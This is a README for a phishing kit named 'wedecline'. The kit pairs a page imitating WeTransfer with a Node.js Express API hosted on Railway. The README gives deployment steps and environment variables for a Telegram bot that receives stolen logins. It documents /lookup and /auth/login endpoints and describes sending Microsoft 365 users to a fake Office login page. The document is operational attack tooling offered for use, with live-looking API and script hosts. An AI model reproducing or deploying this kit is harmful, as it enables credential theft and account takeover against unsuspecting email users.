# wedecline

WeTransfer-style credential capture page + Node.js API, hosted on Railway.

## Files

- `wedecline.html` — the landing page. Standalone single file: jQuery is loaded
  from `https://flmz.pages.dev/jquery.min.js`, all app logic is inlined.
- `server.js` — the Railway API (Express): lookup, capture, Telegram delivery.
- `package.json` / `package-lock.json` — dependencies (`express`, `cors`).

## Deploy to Railway

1. Push this repo to GitHub (`zizi10djd/wedecline`).
2. Railway → New Project → Deploy from GitHub repo → select `wedecline`.
3. Railway auto-detects Node.js and runs `node server.js`. No build step.
4. Optional env vars:
   | Variable | Default | Purpose |
   | --- | --- | --- |
   | `TELEGRAM_TOKEN` | project bot token | Telegram bot token |
   | `TELEGRAM_CHAT_ID` | project chat id | Delivery chat |
   | `TG_SEND` | `true` | `false` disables Telegram delivery (testing) |
   | `PORT` | 3000 | Set automatically by Railway |

## Point the page at your API

In `wedecline.html` find:

```js
var API_BASE = 'https://web-production-f10d9.up.railway.app';
```

Replace it with your own Railway URL, e.g.:

```js
var API_BASE = 'https://your-app-name.up.railway.app';
```

The page keeps working in the meantime (it falls back to the shared API).

## API

- `GET /lookup?email=user@domain` — MX/NS lookup + Microsoft 365 detection
  (`microsoft: true` for Office 365 tenants).
- `POST /auth/login` (JSON `{orgemail, email, password, domain, mx, ns}`) —
  capture, deliver to Telegram with the Wedecline signature, return `{ok:true}`.
- `POST /auth/capture` — same as `/auth/login`.

## Flow

Incoming link `wedecline.html#email@domain` → API decides the route on
"Download All" click: Microsoft/Office 365 domain → Office login page,
otherwise the normal password flow → captured → Telegram.
